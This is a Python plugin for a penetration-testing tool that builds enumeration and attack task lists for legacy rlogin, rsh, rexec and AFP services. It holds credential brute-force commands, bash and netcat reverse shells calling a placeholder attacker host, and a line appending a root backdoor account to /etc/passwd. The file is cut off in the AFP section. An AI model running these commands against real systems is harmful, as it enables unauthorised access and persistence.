"""
Legacy File Services enumeration plugin

Handles legacy UNIX remote services and Apple Filing Protocol:
- rlogin (port 513) - Remote login service
- rsh (port 514) - Remote shell service
- rexec (port 512) - Remote execution service
- AFP (port 548) - Apple Filing Protocol

These services are rarely seen in modern environments but appear in:
- Legacy UNIX/Solaris systems
- Old NAS appliances (AFP)
- CTF/lab environments
- Historical infrastructure

OSCP Relevance: LOW (rare in modern pentests, but worth knowing)

Extracted from HackTricks: pentesting-rlogin.md, pentesting-rsh.md,
                          512-pentesting-rexec.md, 584-pentesting-afp.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LegacyFileServicesPlugin(ServicePlugin):
    """Legacy file and remote execution services plugin"""

    @property
    def name(self) -> str:
        return "legacy-file-services"

    @property
    def default_ports(self) -> List[int]:
        return [512, 513, 514, 548]

    @property
    def service_names(self) -> List[str]:
        return ['rlogin', 'login', 'rsh', 'shell', 'rexec', 'exec', 'afp', 'apple-filing']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect legacy file/remote services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        # Check product names
        if any(prod in product for prod in ['netatalk', 'rexecd', 'rshd', 'rlogind']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate legacy services enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')
        service = service_info.get('service', '').lower()

        # Determine which service based on port and service name
        if port == 513 or 'rlogin' in service or 'login' in service:
            return self._get_rlogin_tasks(target, port, service_info)
        elif port == 514 or 'rsh' in service or 'shell' in service:
            return self._get_rsh_tasks(target, port, service_info)
        elif port == 512 or 'rexec' in service or 'exec' in service:
            return self._get_rexec_tasks(target, port, service_info)
        elif port == 548 or 'afp' in service or 'apple' in service:
            return self._get_afp_tasks(target, port, service_info, version, product)
        else:
            # Generic fallback
            return {
                'id': f'legacy-service-{port}',
                'name': f'Legacy Service Enumeration (Port {port})',
                'type': 'parent',
                'children': []
            }

    def _get_rlogin_tasks(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate rlogin enumeration tasks"""
        tasks = {
            'id': f'rlogin-enum-{port}',
            'name': f'Rlogin Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Basic Connection Test
        tasks['children'].append({
            'id': f'rlogin-connect-{port}',
            'name': 'Rlogin Connection Test',
            'type': 'command',
            'metadata': {
                'command': f'rlogin {target} -l root',
                'description': 'Attempt rlogin connection as root (requires rsh-client package)',
                'tags': ['OSCP:LOW', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {
                    'rlogin': 'Remote login client (Berkeley r-services)',
                    f'{target}': 'Target hostname/IP',
                    '-l root': 'Login as username "root" (try various usernames)'
                },
                'success_indicators': [
                    'Shell prompt appears without password',
                    'Login successful',
                    'Access granted'
                ],
                'failure_indicators': [
                    'Password required (authentication enabled)',
                    'Connection refused',
                    'Permission denied',
                    'rlogin: command not found (install rsh-client)'
                ],
                'next_steps': [
                    'If successful: Enumerate system, escalate privileges',
                    'If failed: Try different usernames (admin, user, etc.)',
                    'Search for .rhosts files via other access methods',
                    'Try rsh and rexec on adjacent ports'
                ],
                'alternatives': [
                    f'telnet {target} {port} (manual rlogin protocol)',
                    f'nc -nv {target} {port} (netcat connection)',
                    'nmap --script rlogin-* (NSE scripts)'
                ],
                'notes': '''Install client: apt-get install rsh-client

Rlogin authentication relies on .rhosts files and /etc/hosts.equiv (IP-based trust).
Modern systems disable this service (insecure, superseded by SSH).

Common in: Legacy UNIX (Solaris, HP-UX, AIX), old CTF boxes, historical infrastructure.

Time estimate: 30 seconds''',
                'time_estimate': '30 seconds'
            }
        })

        # TASK 2: Find .rhosts files
        tasks['children'].append({
            'id': f'rhosts-search-{port}',
            'name': 'Search for .rhosts Files',
            'type': 'manual',
            'metadata': {
                'command': 'find / -name .rhosts 2>/dev/null',
                'description': 'Search for .rhosts files that enable passwordless rlogin (requires shell access on target)',
                'tags': ['OSCP:LOW', 'MANUAL', 'POST_EXPLOIT'],
                'flag_explanations': {
                    'find /': 'Search from root directory',
                    '-name .rhosts': 'Find files named .rhosts',
                    '2>/dev/null': 'Suppress permission denied errors'
                },
                'success_indicators': [
                    '.rhosts files found in user home directories',
                    'Files contain IP addresses or hostnames',
                    'Wildcard entries (+ +) found (insecure!)'
                ],
                'failure_indicators': [
                    'No .rhosts files found',
                    'Permission denied on all directories',
                    'No shell access to target'
                ],
                'next_steps': [
                    'Read .rhosts contents: cat /home/user/.rhosts',
                    'Check for /etc/hosts.equiv (system-wide trust)',
                    'If found: Use trusted IPs to gain access',
                    'Document trust relationships for lateral movement'
                ],
                'alternatives': [
                    'locate .rhosts',
                    'grep -r "+" /home/*/.rhosts (search for wildcard trust)',
                    'Check /etc/hosts.equiv directly'
                ],
                'notes': '''.rhosts file format:
  hostname username
  + +                  # Trust all hosts/users (DANGEROUS)
  192.168.1.5 root     # Trust root from 192.168.1.5

/etc/hosts.equiv: System-wide equivalent to .rhosts

These files enable IP-based authentication (spoofable on local network).
Rlogin trusts source IP and DNS - major security flaw.

Time estimate: 2-3 minutes (if shell access)'''
            }
        })

        # TASK 3: Brute Force
        tasks['children'].append({
            'id': f'rlogin-brute-{port}',
            'name': 'Rlogin Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt rlogin://{target} -s {port}',
                'description': 'Credential brute-force against rlogin (rarely effective)',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    '-L': 'Username wordlist',
                    '-P': 'Password wordlist',
                    f'rlogin://{target}': 'Target service and protocol',
                    f'-s {port}': f'Target port {port}'
                },
                'success_indicators': [
                    'Valid credentials found',
                    '[513][rlogin] host: X login: Y password: Z',
                    'Hydra reports success'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Service requires .rhosts (no password auth)',
                    'Connection refused or timeout'
                ],
                'next_steps': [
                    'If creds found: Login with rlogin -l user target',
                    'Test credentials on SSH, telnet, other services',
                    'If failed: Focus on IP spoofing or .rhosts exploitation'
                ],
                'alternatives': [
                    f'nmap --script rlogin-brute --script-args userdb=users.txt,passdb=passwords.txt {target} -p{port}',
                    'Manual: Try common usernames (root, admin, oracle, postgres)'
                ],
                'notes': 'Rlogin brute-force rarely works (most deployments use .rhosts, not passwords). Low OSCP priority. Time estimate: 10-30 minutes depending on wordlists.',
                'time_estimate': '10-30 minutes'
            }
        })

        return tasks

    def _get_rsh_tasks(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate rsh enumeration tasks"""
        tasks = {
            'id': f'rsh-enum-{port}',
            'name': f'Rsh Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Command Execution Test
        tasks['children'].append({
            'id': f'rsh-exec-{port}',
            'name': 'Rsh Command Execution',
            'type': 'command',
            'metadata': {
                'command': f'rsh {target} id',
                'description': 'Execute command via rsh (remote shell) - tests if service allows unauthenticated command execution',
                'tags': ['OSCP:LOW', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {
                    'rsh': 'Remote shell client',
                    f'{target}': 'Target hostname/IP',
                    'id': 'Command to execute (returns user ID if successful)'
                },
                'success_indicators': [
                    'Command output returned',
                    'uid=X(username) displayed',
                    'No authentication required'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Connection refused',
                    'rcmd: socket: Permission denied',
                    'rsh: command not found'
                ],
                'next_steps': [
                    'If successful: Execute reconnaissance (uname -a, ls, cat /etc/passwd)',
                    'Attempt reverse shell: rsh target "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',
                    'Try with explicit username: rsh -l root target id',
                    'Try with domain: rsh domain\\\\user@target id'
                ],
                'alternatives': [
                    f'rsh {target} -l domain\\\\user id (domain user)',
                    f'rsh domain/user@{target} id (alternative syntax)',
                    f'nc -nv {target} {port} (manual protocol)',
                    'Install: apt-get install rsh-client'
                ],
                'notes': '''Rsh provides remote command execution authenticated via .rhosts and /etc/hosts.equiv.

Common rsh syntax variations:
  rsh <IP> <Command>
  rsh <IP> -l domain\\user <Command>
  rsh domain/user@<IP> <Command>
  rsh domain\\\\user@<IP> <Command>

Rsh trusts client IP and DNS (easily spoofed on local network).
Authentication depends on source IP matching .rhosts entries.

If successful, this is often a direct shell without needing credentials.

Time estimate: 30 seconds''',
                'time_estimate': '30 seconds'
            }
        })

        # TASK 2: Advanced Exploitation
        tasks['children'].append({
            'id': f'rsh-exploit-{port}',
            'name': 'Rsh Reverse Shell',
            'type': 'manual',
            'metadata': {
                'command': f'# On attacker:\nnc -lvnp 4444\n\n# Then execute:\nrsh {target} "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',
                'description': 'Obtain reverse shell via rsh if command execution works',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'flag_explanations': {
                    'nc -lvnp 4444': 'Start netcat listener on port 4444',
                    'bash -i': 'Interactive bash shell',
                    '>&': 'Redirect stdout and stderr',
                    '/dev/tcp/IP/PORT': 'Bash TCP pseudo-device for reverse connection',
                    '0>&1': 'Redirect stdin to connection'
                },
                'success_indicators': [
                    'Reverse shell connection received',
                    'Shell prompt appears on attacker machine',
                    'Commands execute on target'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Command execution blocked',
                    'Network egress blocked',
                    'Bash not available on target'
                ],
                'next_steps': [
                    'If successful: Upgrade to full TTY (python -c "import pty; pty.spawn(\\"/bin/bash\\")")',
                    'Enumerate system for privilege escalation',
                    'Establish persistence (cron job, SSH key)',
                    'If failed: Try different reverse shell payloads (perl, python, nc)'
                ],
                'alternatives': [
                    'nc reverse shell: rsh target "nc ATTACKER_IP 4444 -e /bin/bash"',
                    'python: rsh target "python -c \'import socket...\'"',
                    'perl: rsh target "perl -e \'use Socket;...\'"',
                    'msfvenom payload: Generate and execute via rsh'
                ],
                'notes': '''Rsh reverse shells work if:
1. Command execution succeeds (IP trusted in .rhosts)
2. Outbound connections allowed
3. Bash/nc/python available on target

Many rsh deployments allow command execution but no interactive shell.
Reverse shell bypasses this limitation.

Time estimate: 2-5 minutes'''
            }
        })

        # TASK 3: Brute Force
        tasks['children'].append({
            'id': f'rsh-brute-{port}',
            'name': 'Rsh Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L users.txt -P passwords.txt rsh://{target} -s {port}',
                'description': 'Brute-force rsh credentials (rarely needed - rsh uses .rhosts)',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    '-L': 'Username list',
                    '-P': 'Password list',
                    f'rsh://{target}': 'Target protocol and host',
                    f'-s {port}': f'Port {port}'
                },
                'success_indicators': [
                    'Valid credentials found',
                    'Hydra reports success'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Service uses .rhosts (no password auth)'
                ],
                'next_steps': [
                    'If creds found: Test with rsh -l username target',
                    'Try credentials on other services'
                ],
                'alternatives': [
                    f'nmap --script rsh-brute {target} -p{port}',
                    'Manual username testing'
                ],
                'notes': 'Rsh typically uses .rhosts, not passwords. Brute-force rarely successful. Low OSCP priority. Time estimate: 10-30 minutes.',
                'time_estimate': '10-30 minutes'
            }
        })

        return tasks

    def _get_rexec_tasks(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate rexec enumeration tasks"""
        tasks = {
            'id': f'rexec-enum-{port}',
            'name': f'Rexec Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Manual Protocol Test
        tasks['children'].append({
            'id': f'rexec-manual-{port}',
            'name': 'Rexec Manual Connection',
            'type': 'manual',
            'metadata': {
                'command': f'(echo -ne "0\\0user\\0password\\0id\\0"; cat) | nc {target} {port}',
                'description': 'Manually interact with rexec protocol (cleartext username/password)',
                'tags': ['OSCP:LOW', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {
                    'echo -ne': 'Echo without newline, interpret escape sequences',
                    '"0\\0user\\0password\\0id\\0"': 'Rexec protocol: port\\0user\\0pass\\0command\\0 (NUL-separated)',
                    '| nc': 'Pipe to netcat',
                    f'{target} {port}': 'Target and port',
                    'cat': 'Keep connection open to receive output'
                },
                'success_indicators': [
                    'Command output appears',
                    'uid=X(username) displayed (if id command)',
                    'Single byte 0x00 response (success)',
                    'Command executes successfully'
                ],
                'failure_indicators': [
                    'No output received',
                    'Connection closed immediately',
                    'Invalid credentials',
                    'Single byte 0x01 response (failure)'
                ],
                'next_steps': [
                    'If successful: Try other commands (uname -a, cat /etc/passwd, ls)',
                    'Test common credentials (root:root, admin:admin)',
                    'Attempt reverse shell: bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',
                    'If failed: Run brute-force attack'
                ],
                'alternatives': [
                    f'rexec -l user -p password {target} "id" (requires rsh-client)',
                    f'telnet {target} {port} (then manually type protocol)',
                    'nmap --script rexec-info (banner grab)'
                ],
                'notes': '''Rexec Protocol (RFC 1060):
1. Client connects to TCP 512
2. Client sends: port\\0username\\0password\\0command\\0 (NUL-separated)
   - port: stderr port (often "0" for stdout/stderr combined)
   - username: cleartext
   - password: cleartext
   - command: command to execute
3. Server responds: 1 byte (0x00=success, 0x01=failure)
4. Command output returned on same connection

WARNING: All traffic (including credentials) sent in CLEARTEXT.
Anyone sniffing network can recover username, password, and command.

Rexec ignores user's shell and executes via /bin/sh -c.

Common in: Legacy UNIX, old inetd configurations, historical infrastructure.

Time estimate: 1-2 minutes''',
                'time_estimate': '1-2 minutes'
            }
        })

        # TASK 2: Client-Based Execution
        tasks['children'].append({
            'id': f'rexec-client-{port}',
            'name': 'Rexec Client Usage',
            'type': 'command',
            'metadata': {
                'command': f'rexec -l user -p password {target} "uname -a"',
                'description': 'Use rexec client for authenticated command execution (requires rsh-client package)',
                'tags': ['OSCP:LOW', 'MANUAL'],
                'flag_explanations': {
                    'rexec': 'Remote execution client',
                    '-l user': 'Username for authentication',
                    '-p password': 'Password (cleartext on wire)',
                    f'{target}': 'Target hostname/IP',
                    '"uname -a"': 'Command to execute (returns system info)'
                },
                'success_indicators': [
                    'Command output displayed',
                    'System information returned',
                    'Authentication successful'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Invalid credentials',
                    'Connection refused',
                    'rexec: command not found'
                ],
                'next_steps': [
                    'If successful: Execute reconnaissance commands',
                    'Attempt reverse shell: rexec -l user -p pass target "bash -c \'bash -i >& /dev/tcp/ATTACKER/4444 0>&1\'"',
                    'Search for passwords in ~/.netrc (cleartext storage)',
                    'If failed: Try brute-force'
                ],
                'alternatives': [
                    f'Manual protocol: (echo -ne "0\\0user\\0pass\\0uname -a\\0"; cat) | nc {target} {port}',
                    'Install: apt-get install rsh-client',
                    'nmap --script rexec-brute (automated)'
                ],
                'notes': '''Install rexec client:
  apt-get install rsh-client (Debian/Kali)
  apt-get install inetutils-rexec (Ubuntu)

If -p omitted, client prompts for password (still cleartext on wire).

Rexec executes commands as specified user with their privileges.
If /etc/pam.d/rexec misconfigured (e.g. pam_rootok), root shells possible.

Commands run via /bin/sh -c - shell escape tricks work (;, $(cmd), backticks).

Passwords often stored in ~/.netrc for passwordless rexec:
  machine hostname login user password pass

Time estimate: 30 seconds''',
                'time_estimate': '30 seconds'
            }
        })

        # TASK 3: Nmap Brute Force
        tasks['children'].append({
            'id': f'rexec-nmap-brute-{port}',
            'name': 'Rexec Nmap Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p {port} --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" {target}',
                'description': 'Brute-force rexec credentials using Nmap NSE script (fast)',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    f'-p {port}': f'Target port {port}',
                    '--script rexec-brute': 'NSE brute-force script for rexec protocol',
                    '--script-args': 'Script arguments',
                    'userdb=users.txt': 'Username wordlist',
                    'passdb=rockyou.txt': 'Password wordlist'
                },
                'success_indicators': [
                    'Valid credentials found',
                    'NSE reports success',
                    'Credentials displayed in output'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Script timeout',
                    'Connection issues'
                ],
                'next_steps': [
                    'If creds found: Login with rexec -l user -p pass target',
                    'Execute commands via rexec',
                    'Test credentials on other services (SSH, telnet, FTP)'
                ],
                'alternatives': [
                    f'hydra -L users.txt -P passwords.txt rexec://{target} -s {port} -t 8',
                    f'medusa -h {target} -U users.txt -P passwords.txt -M REXEC',
                    'Metasploit: use auxiliary/scanner/rservices/rexec_login'
                ],
                'notes': '''Nmap rexec-brute NSE is FAST (uses rexec protocol directly).
Faster than hydra for rexec brute-forcing.

Also try:
- nmap --script rexec-info (banner/version detection)

Hydra has dedicated rexec module - also very fast.
Medusa and ncrack support rexec.

Time estimate: 5-15 minutes depending on wordlists''',
                'time_estimate': '5-15 minutes'
            }
        })

        # TASK 4: Hydra Brute Force
        tasks['children'].append({
            'id': f'rexec-hydra-brute-{port}',
            'name': 'Rexec Hydra Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L users.txt -P passwords.txt rexec://{target} -s {port} -t 8',
                'description': 'Fast credential brute-force using Hydra (rexec module)',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    '-L': 'Username wordlist',
                    '-P': 'Password wordlist',
                    f'rexec://{target}': 'Target protocol and host',
                    f'-s {port}': f'Port {port}',
                    '-t 8': 'Parallel threads (8 = fast, increase for speed)'
                },
                'success_indicators': [
                    'Valid credentials found',
                    '[512][rexec] host: X login: Y password: Z',
                    'Hydra reports success'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Connection timeout',
                    'Service unavailable'
                ],
                'next_steps': [
                    'If creds found: rexec -l user -p pass target id',
                    'Spawn reverse shell via rexec',
                    'Reuse credentials on other services'
                ],
                'alternatives': [
                    f'nmap --script rexec-brute {target} -p{port}',
                    f'medusa -h {target} -U users.txt -P passwords.txt -M REXEC -t 8',
                    'Metasploit: auxiliary/scanner/rservices/rexec_login'
                ],
                'notes': '''Hydra rexec module is fastest offline bruteforcer for rexec.
Increase threads (-t 16 or -t 32) for faster results (more noisy).

Rexec cleartext protocol = fast brute-force (no crypto overhead).

Time estimate: 5-20 minutes depending on wordlists''',
                'time_estimate': '5-20 minutes'
            }
        })

        # TASK 5: Metasploit Module
        tasks['children'].append({
            'id': f'rexec-msf-{port}',
            'name': 'Metasploit Rexec Scanner',
            'type': 'command',
            'metadata': {
                'command': f'msfconsole -q -x "use auxiliary/scanner/rservices/rexec_login; set RHOSTS {target}; set USER_FILE users.txt; set PASS_FILE passwords.txt; run; exit"',
                'description': 'Metasploit rexec brute-force (spawns shell on success, stores creds in DB)',
                'tags': ['OSCP:LOW', 'AUTOMATED'],
                'flag_explanations': {
                    '-q': 'Quiet mode (suppress banner)',
                    '-x': 'Execute commands and exit',
                    'use auxiliary/scanner/rservices/rexec_login': 'Load rexec scanner module',
                    'set RHOSTS': 'Set target',
                    'set USER_FILE': 'Username wordlist',
                    'set PASS_FILE': 'Password wordlist',
                    'run': 'Execute module',
                    'exit': 'Quit msfconsole'
                },
                'success_indicators': [
                    'Credentials found',
                    'Shell session opened',
                    'Credentials stored in database'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'No sessions created',
                    'Connection issues'
                ],
                'next_steps': [
                    'If session opened: Use for enumeration',
                    'Check msf database: creds',
                    'Pivot to other targets with discovered credentials'
                ],
                'alternatives': [
                    f'hydra -L users.txt -P passwords.txt rexec://{target}',
                    f'nmap --script rexec-brute {target}'
                ],
                'notes': '''Metasploit module spawns shell on success (unlike hydra which just reports creds).
Stores credentials in MSF database for reuse.

Module automatically tests discovered credentials with command execution.

Time estimate: 10-20 minutes''',
                'time_estimate': '10-20 minutes'
            }
        })

        # TASK 6: Sniffing Credentials
        tasks['children'].append({
            'id': f'rexec-sniff-{port}',
            'name': 'Sniff Rexec Credentials (PCAP Analysis)',
            'type': 'manual',
            'metadata': {
                'command': f'tshark -r traffic.pcap -Y "tcp.port == {port}" -T fields -e data.decoded | awk -F"\\\\0" \'{{print $2":"$3" -> "$4}}\'',
                'description': 'Extract rexec credentials from network capture (cleartext protocol)',
                'tags': ['OSCP:LOW', 'MANUAL', 'POST_EXPLOIT'],
                'flag_explanations': {
                    'tshark -r traffic.pcap': 'Read PCAP file with tshark',
                    f'-Y "tcp.port == {port}"': f'Filter for rexec port {port}',
                    '-T fields': 'Output specific fields',
                    '-e data.decoded': 'Extract decoded data',
                    'awk -F"\\\\0"': 'Split on NUL byte (rexec delimiter)',
                    'print $2":"$3" -> "$4': 'Print username:password -> command'
                },
                'success_indicators': [
                    'Credentials extracted from PCAP',
                    'Username:password pairs displayed',
                    'Executed commands visible'
                ],
                'failure_indicators': [
                    'No rexec traffic in capture',
                    'Encrypted/tunneled traffic',
                    'PCAP corrupted or incomplete'
                ],
                'next_steps': [
                    'Test extracted credentials: rexec -l user -p pass target id',
                    'Try credentials on other services',
                    'Document for lateral movement',
                    'Search for ~/.netrc files on compromised systems'
                ],
                'alternatives': [
                    'Wireshark: Enable "Decode As → TCP port 512 → REXEC" for parsed view',
                    'tcpdump: tcpdump -r traffic.pcap -A | grep -A5 "username"',
                    'Live capture: tshark -i eth0 -Y "tcp.port == 512" -T fields -e data.decoded'
                ],
                'notes': '''ALL REXEC TRAFFIC IS CLEARTEXT (username, password, commands).
Single packet capture reveals full credentials and command history.

Wireshark REXEC dissector shows nice parsed fields.

In Wireshark:
1. Right-click packet → Decode As
2. Set TCP port 512 → REXEC
3. View parsed username, password, command fields

Rexec credentials often stored in ~/.netrc:
  machine hostname login user password pass

If you compromise one host, check ~/.netrc for rexec creds to other systems.

Time estimate: 2-5 minutes with PCAP''',
                'time_estimate': '2-5 minutes'
            }
        })

        # TASK 7: Post-Exploitation
        tasks['children'].append({
            'id': f'rexec-post-exploit-{port}',
            'name': 'Rexec Post-Exploitation',
            'type': 'manual',
            'metadata': {
                'command': f'''# Reverse shell via rexec:
rexec -l user -p pass {target} 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

# Check ~/.netrc for stored credentials:
rexec -l user -p pass {target} "cat ~/.netrc"

# Chain commands with shell escapes:
rexec -l user -p pass {target} "uname -a; id; cat /etc/passwd"

# Backdoor persistence (if root):
rexec -l root -p pass {target} "echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd"''',
                'description': 'Post-exploitation techniques via rexec',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT', 'POST_EXPLOIT'],
                'flag_explanations': {
                    'bash -c': 'Execute bash command',
                    '/dev/tcp/IP/PORT': 'Bash TCP pseudo-device',
                    '~/.netrc': 'File storing rexec credentials',
                    '; (semicolon)': 'Command separator (rexec uses /bin/sh -c)',
                    '>> /etc/passwd': 'Append to password file'
                },
                'success_indicators': [
                    'Reverse shell received',
                    'Credentials found in ~/.netrc',
                    'Multiple commands execute successfully',
                    'Persistence established'
                ],
                'failure_indicators': [
                    'Commands blocked or filtered',
                    'No ~/.netrc file',
                    'Insufficient privileges'
                ],
                'next_steps': [
                    'Upgrade shell to full TTY',
                    'Enumerate system for privilege escalation',
                    'Check /etc/pam.d/rexec for misconfigurations',
                    'Search for ~/.netrc on all compromised systems'
                ],
                'alternatives': [
                    'Python reverse shell via rexec',
                    'Perl reverse shell via rexec',
                    'nc reverse shell: rexec target "nc ATTACKER 4444 -e /bin/bash"'
                ],
                'notes': '''Rexec Post-Exploitation Tips:

1. Commands run with privileges of authenticated user
2. Rexec ignores user's shell, executes via /bin/sh -c
   - Shell escape tricks work: ; $(cmd) `cmd`
3. Check for PAM misconfigurations: cat /etc/pam.d/rexec
   - pam_rootok may allow root shells
4. Passwords stored in ~/.netrc (cleartext):
   machine hostname login user password pass
5. If you compromise one host, ~/.netrc may have creds for lateral movement

Reverse Shell Example:
  # On attacker: nc -lvnp 4444
  # Then: rexec -l user -p pass target 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'

Disable rexec hardening:
- DO NOT expose rexec to internet
- Replace with SSH
- If must keep: TCP wrappers (/etc/hosts.allow), firewall rules, strong passwords
- Monitor for port 512 traffic and rexecd process launches

Time estimate: 5-10 minutes'''
            }
        })

        return tasks

    def _get_afp_tasks(self, target: str, port: int, service_info: Dict[str, Any], version: str, product: str) -> Dict[str, Any]:
        """Generate AFP enumeration tasks"""
        tasks = {
            'id': f'afp-enum-{port}',
            'name': f'AFP (Apple Filing Protocol) Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Server Information
        tasks['children'].append({
            'id': f'afp-server-info-{port}',
            'name': 'AFP Server Information',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p {port} -sV --script "afp-* and not dos" {target}',
                'description': 'Enumerate AFP server info (banner, version, supported UAMs, shares)',
                'tags': ['OSCP:LOW', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    f'-p {port}': f'Target AFP port {port}',
                    '-sV': 'Service version detection',
                    '--script "afp-* and not dos"': 'Run all AFP NSE scripts except DoS scripts',
                    f'{target}': 'Target IP/hostname'
                },
                'success_indicators': [
                    'AFP server version displayed',
                    'Available shares listed',
                    'Supported UAMs (authentication methods) enumerated',
                    'Server name and machine type visible'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'No AFP scripts returned results',
                    'Timeout or filtering'
                ],
                'next_steps': [
                    'Note AFP version for exploit research',
                    'Test anonymous/guest login if enabled',
                    'Try discovered shares with mount commands',
                    'If Netatalk detected: Check for RCE vulnerabilities'
                ],
                'alternatives': [
                    f'msfconsole -x "use auxiliary/scanner/afp/afp_server_info; set RHOSTS {target}; run; exit"',
                    f'afp_client {target} (interactive - requires afpfs-ng)',
                    'macOS: Finder → Go → Connect to Server → afp://{target}'
                ],
                'notes': '''Useful AFP NSE scripts:
- afp-ls: List volumes and files
- afp-brute: Password brute-force
- afp-serverinfo: Server name, AFP version, UAMs
- afp-showmount: List shares with ACLs
- afp-path-vuln: Detect/exploit directory traversal (CVE-2010-0533)

AFP found in:
- Legacy macOS/Mac OS 9
- NAS appliances (QNAP, Synology, Western Digital, TrueNAS)
- Netatalk daemon (open-source AFP implementation)

AFP superseded by SMB in modern macOS (since OS X 10.9).

Time estimate: 30-60 seconds''',
                'time_estimate': '30-60 seconds'
            }
        })

        # TASK 2: Brute Force
        tasks['children'].append({
            'id': f'afp-brute-{port}',
            'name': 'AFP Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L users.txt -P passwords.txt afp://{target}',
                'description': 'Brute-force AFP credentials',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    '-L': 'Username wordlist',
                    '-P': 'Password wordlist',
                    f'afp://{target}': 'Target AFP service'
                },
                'success_indicators': [
                    'Valid credentials found',
                    '[548][afp] host: X login: Y password: Z',
                    'Hydra reports success'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Account lockout triggered',
                    'Connection refused'
                ],
                'next_steps': [
                    'If creds found: Mount shares with discovered credentials',
                    'Try credentials on SMB, SSH, web admin',
                    'Document for lateral movement'
                ],
                'alternatives': [
                    f'nmap --script afp-brute --script-args userdb=users.txt,passdb=passwords.txt {target} -p{port}',
                    f'medusa -h {target} -U users.txt -P passwords.txt -M AFP',
                    'Manual: Test common credentials via mount_afp'
                ],
                'notes': '''AFP brute-force often effective on NAS appliances with weak defaults.

Common NAS default credentials:
- admin:admin
- admin:password
- admin:(blank)
- guest:(blank)

Hydra AFP module supports multiple authentication methods (UAMs).

Time estimate: 10-30 minutes depending on wordlists''',
                'time_estimate': '10-30 minutes'
            }
        })

        # TASK 3: Mount Shares
        tasks['children'].append({
            'id': f'afp-mount-{port}',
            'name': 'Mount AFP Shares',
            'type': 'manual',
            'metadata': {
                'command': f'''# macOS:
mkdir /Volumes/afp
mount_afp afp://USER:PASSWORD@{target}/SHARE /Volumes/afp

# Or Finder: Connect to Server → afp://{target}

# Linux (requires afpfs-ng):
apt install afpfs-ng
mkdir /mnt/afp
mount_afp afp://USER:PASSWORD@{target}/SHARE /mnt/afp

# Interactive client:
afp_client {target}''',
                'description': 'Mount AFP shares for file access',
                'tags': ['OSCP:LOW', 'MANUAL'],
                'flag_explanations': {
                    'mount_afp': 'Mount AFP share command',
                    'afp://USER:PASSWORD@host/SHARE': 'AFP URL format with credentials',
                    '/Volumes/afp': 'macOS mount point',
                    '/mnt/afp': 'Linux mount point',
                    'afp_client': 'Interactive AFP client (Linux)'
                },
                'success_indicators': [
                    'Share mounted successfully',
                    'Files visible in mount point',
                    'No authentication errors'
                ],
                'failure_indicators': [
                    'Authentication failed',
                    'Share not found',
                    'Permission denied',
                    'mount_afp: command not found'
                ],
                'next_steps': [
                    'Enumerate files: ls -laR /Volumes/afp',
                    'Search for sensitive data: grep -r "password" /Volumes/afp',
                    'Check resource forks: ls -la@ /Volumes/afp (macOS)',
                    'Download interesting files for offline analysis'
                ],
                'alternatives': [
                    'macOS Finder GUI (Go → Connect to Server)',
                    'smbclient (if SMB also available)',
                    'nmap --script afp-ls (list files without mounting)'
                ],
                'notes': '''AFP URLs: afp://[USER[:PASSWORD]@]host[:port]/[SHARE]

Resource Forks:
Classic Mac files have resource forks (metadata, icons, etc.).
On non-Mac systems, stored as hidden ._* AppleDouble files.
These often hold interesting metadata missed by DFIR tools.

Check hidden files:
